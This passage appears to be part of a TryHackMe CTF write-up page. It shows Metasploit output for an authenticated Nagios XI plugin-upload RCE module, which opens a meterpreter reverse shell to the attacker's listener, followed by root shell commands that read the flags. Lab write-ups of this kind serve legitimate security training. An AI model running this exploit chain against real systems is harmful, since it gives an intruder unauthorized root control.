+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">nagios_xi_plugins_check_plugin_authenticated_rce</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">show</span> <span class="n">options</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Module</span> <span class="n">options</span> <span class="p">(</span><span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">nagios_xi_plugins_check_plugin_authenticated_rce</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>            <span class="n">Current</span> <span class="n">Setting</span>       <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>            <span class="o">---------------</span>       <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">FINISH_INSTALL</span>  <span class="n">false</span>                 <span class="n">no</span>        <span class="n">If</span> <span class="n">the</span> <span class="n">Nagios</span> <span class="n">XI</span> <span class="n">installation</span> <span class="n">has</span> <span class="ow">not</span> <span class="n">been</span> <span class="n">completed</span><span class="p">,</span> <span class="k">try</span> <span class="n">to</span> <span class="n">do</span> <span class="n">so</span><span class="o">.</span> <span class="n">This</span> <span class="n">includes</span> <span class="n">signing</span> <span class="n">the</span> <span class="n">license</span> <span class="n">agreement</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="n">PASSWORD</span>        <span class="n">n3p3UQ</span><span class="o">&amp;</span><span class="mi">9</span><span class="n">BjLp4</span><span class="err">$</span><span class="mi">7</span><span class="n">uhWdY</span>  <span class="n">yes</span>       <span class="n">Password</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="k">with</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Proxies</span>                               <span class="n">no</span>        <span class="n">A</span> <span class="n">proxy</span> <span class="n">chain</span> <span class="n">of</span> <span class="nb">format</span> <span class="nb">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">[,</span><span class="nb">type</span><span class="p">:</span><span class="n">host</span><span class="p">:</span><span class="n">port</span><span class="p">][</span><span class="o">...</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">   <span class="n">RHOSTS</span>          <span class="mf">10.10.208.133</span>         <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">host</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="n">see</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">docs</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">/</span><span class="n">basics</span><span class="o">/</span><span class="n">using</span><span class="o">-</span><span class="n">metasploit</span><span class="o">.</span><span class="n">html</span>
+</span></span><span class="line"><span class="cl">   <span class="n">RPORT</span>           <span class="mi">80</span>                    <span class="n">yes</span>       <span class="n">The</span> <span class="n">target</span> <span class="n">port</span> <span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SSL</span>             <span class="n">false</span>                 <span class="n">no</span>        <span class="n">Negotiate</span> <span class="n">SSL</span><span class="o">/</span><span class="n">TLS</span> <span class="k">for</span> <span class="n">outgoing</span> <span class="n">connections</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SSLCert</span>                               <span class="n">no</span>        <span class="n">Path</span> <span class="n">to</span> <span class="n">a</span> <span class="n">custom</span> <span class="n">SSL</span> <span class="n">certificate</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="n">randomly</span> <span class="n">generated</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">TARGETURI</span>       <span class="o">/</span><span class="n">nagiosxi</span><span class="o">/</span>            <span class="n">yes</span>       <span class="n">The</span> <span class="n">base</span> <span class="n">path</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Nagios</span> <span class="n">XI</span> <span class="n">application</span>
+</span></span><span class="line"><span class="cl">   <span class="n">URIPATH</span>                               <span class="n">no</span>        <span class="n">The</span> <span class="n">URI</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">this</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">default</span> <span class="ow">is</span> <span class="n">random</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">USERNAME</span>        <span class="n">nagiosadmin</span>           <span class="n">yes</span>       <span class="n">Username</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="k">with</span>
+</span></span><span class="line"><span class="cl">   <span class="n">VHOST</span>                                 <span class="n">no</span>        <span class="n">HTTP</span> <span class="n">server</span> <span class="n">virtual</span> <span class="n">host</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">When</span> <span class="n">CMDSTAGER</span><span class="p">::</span><span class="n">FLAVOR</span> <span class="ow">is</span> <span class="n">one</span> <span class="n">of</span> <span class="n">auto</span><span class="p">,</span><span class="n">tftp</span><span class="p">,</span><span class="n">wget</span><span class="p">,</span><span class="n">curl</span><span class="p">,</span><span class="n">fetch</span><span class="p">,</span><span class="n">lwprequest</span><span class="p">,</span><span class="n">psh_invokewebrequest</span><span class="p">,</span><span class="n">ftp_http</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>     <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SRVHOST</span>  <span class="mf">0.0.0.0</span>          <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">host</span> <span class="ow">or</span> <span class="n">network</span> <span class="n">interface</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span> <span class="n">This</span> <span class="n">must</span> <span class="n">be</span> <span class="n">an</span> <span class="n">address</span> <span class="n">on</span> <span class="n">the</span> <span class="n">local</span> <span class="n">machine</span> <span class="ow">or</span> <span class="mf">0.0.0.0</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span> <span class="nb">all</span> <span class="n">addresses</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="n">SRVPORT</span>  <span class="mi">8080</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">local</span> <span class="n">port</span> <span class="n">to</span> <span class="n">listen</span> <span class="n">on</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Payload</span> <span class="n">options</span> <span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Name</span>   <span class="n">Current</span> <span class="n">Setting</span>  <span class="n">Required</span>  <span class="n">Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">----</span>   <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="n">LHOST</span>  <span class="mf">10.8.105.194</span>     <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">address</span> <span class="p">(</span><span class="n">an</span> <span class="n">interface</span> <span class="n">may</span> <span class="n">be</span> <span class="n">specified</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="n">LPORT</span>  <span class="mi">6666</span>             <span class="n">yes</span>       <span class="n">The</span> <span class="n">listen</span> <span class="n">port</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Exploit</span> <span class="n">target</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Id</span>  <span class="n">Name</span>
+</span></span><span class="line"><span class="cl">   <span class="o">--</span>  <span class="o">----</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">1</span>   <span class="n">Linux</span> <span class="p">(</span><span class="n">x64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">View</span> <span class="n">the</span> <span class="n">full</span> <span class="n">module</span> <span class="n">info</span> <span class="k">with</span> <span class="n">the</span> <span class="n">info</span><span class="p">,</span> <span class="ow">or</span> <span class="n">info</span> <span class="o">-</span><span class="n">d</span> <span class="n">command</span><span class="o">.</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">msf6</span> <span class="n">exploit</span><span class="p">(</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">nagios_xi_plugins_check_plugin_authenticated_rce</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">reverse</span> <span class="n">TCP</span> <span class="n">handler</span> <span class="n">on</span> <span class="mf">10.8.105.194</span><span class="p">:</span><span class="mi">6666</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="n">automatic</span> <span class="n">check</span> <span class="p">(</span><span class="s2">&#34;set AutoCheck false&#34;</span> <span class="n">to</span> <span class="n">disable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Attempting</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">Nagios</span> <span class="n">XI</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">authenticated</span> <span class="n">to</span> <span class="n">Nagios</span> <span class="n">XI</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="ow">is</span> <span class="n">Nagios</span> <span class="n">XI</span> <span class="k">with</span> <span class="n">version</span> <span class="mf">5.5.6</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">The</span> <span class="n">target</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">vulnerable</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">malicious</span> <span class="s1">&#39;check_ping&#39;</span> <span class="n">plugin</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Command</span> <span class="n">Stager</span> <span class="n">progress</span> <span class="o">-</span> <span class="mf">100.00</span><span class="o">%</span> <span class="n">done</span> <span class="p">(</span><span class="mi">897</span><span class="o">/</span><span class="mi">897</span> <span class="nb">bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">uploaded</span> <span class="n">plugin</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Executing</span> <span class="n">plugin</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Waiting</span> <span class="n">up</span> <span class="n">to</span> <span class="mi">300</span> <span class="n">seconds</span> <span class="k">for</span> <span class="n">the</span> <span class="n">plugin</span> <span class="n">to</span> <span class="n">request</span> <span class="n">the</span> <span class="n">final</span> <span class="n">payload</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">stage</span> <span class="p">(</span><span class="mi">3045348</span> <span class="nb">bytes</span><span class="p">)</span> <span class="n">to</span> <span class="mf">10.10.208.133</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="mi">1</span> <span class="n">opened</span> <span class="p">(</span><span class="mf">10.8.105.194</span><span class="p">:</span><span class="mi">6666</span> <span class="o">-&gt;</span> <span class="mf">10.10.208.133</span><span class="p">:</span><span class="mi">56918</span><span class="p">)</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">21</span> <span class="mi">16</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">40</span> <span class="o">-</span><span class="mi">0400</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Deleting</span> <span class="n">malicious</span> <span class="s1">&#39;check_ping&#39;</span> <span class="n">plugin</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Plugin</span> <span class="n">deleted</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">meterpreter</span> <span class="o">&gt;</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="mi">2440</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Channel</span> <span class="mi">1</span> <span class="n">created</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="nb">id</span>
+</span></span><span class="line"><span class="cl"><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">28</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">------</span>  <span class="mi">4</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">23</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">3106</span> <span class="n">Oct</span> <span class="mi">22</span>  <span class="mi">2015</span> <span class="o">.</span><span class="n">bashrc</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">nano</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>  <span class="mi">148</span> <span class="n">Aug</span> <span class="mi">17</span>  <span class="mi">2015</span> <span class="o">.</span><span class="n">profile</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">38</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">2</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="n">scripts</span>
+</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">THM</span><span class="p">{</span><span class="n">c89b2e39c83067503a6508b21ed6e962</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">3</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">23</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">8</span> <span class="n">galand</span> <span class="n">galand</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="n">galand</span>
+</span></span><span class="line"><span class="cl"><span class="n">ls</span> <span class="o">-</span><span class="n">la</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">galand</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">56</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">8</span> <span class="n">galand</span> <span class="n">galand</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>    <span class="mi">481</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">bash_history</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">galand</span> <span class="n">galand</span>  <span class="mi">220</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">bash_logout</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">galand</span> <span class="n">galand</span> <span class="mi">3771</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">bashrc</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">galand</span> <span class="n">galand</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">6</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">cpan</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwx</span><span class="o">------</span> <span class="mi">2</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">gnupg</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">2</span> <span class="n">galand</span> <span class="n">galand</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">nano</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">galand</span> <span class="n">galand</span>  <span class="mi">655</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">profile</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-------</span> <span class="mi">1</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">1024</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">rnd</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">root</span>   <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">subversion</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">galand</span> <span class="n">galand</span>    <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="o">.</span><span class="n">sudo_as_admin_successful</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">9</span> <span class="n">galand</span> <span class="n">galand</span> <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">23</span>  <span class="mi">2020</span> <span class="n">nagiosxi</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">galand</span> <span class="n">galand</span>   <span class="mi">38</span> <span class="n">Mar</span> <span class="mi">24</span>  <span class="mi">2020</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">galand</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">THM</span><span class="p">{</span><span class="mi">84</span><span class="n">b17add1d72a9f2e99c33bc568ae0f1</span><span class="p">}</span></span></span></code></pre></div></div>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/tryhackme/ha-joker-ctf/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Tryhackme - HA Joker CTF
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2022-05-01T00:00:00&#43;00:00">1 May 2022</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/ctf/tryhackme/mindgames/">
+              <span class="leading-6">
+                Tryhackme - Mindgames&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2022-05-10T00:00:00&#43;00:00">10 May 2022</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+      
+      
+        
+          
+          
+      
+      
+      
+      <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400 ">
+        <ul class="flex list-none flex-col sm:flex-row">
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href="/tags/"
+                title="Tags">
+                
+                Tags
+              </a>
+            </li>
+          
+            <li class=" flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0 ">
+              <a
+                class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center"
+                href=""
+                title="">
+                
+                
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          TAH
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
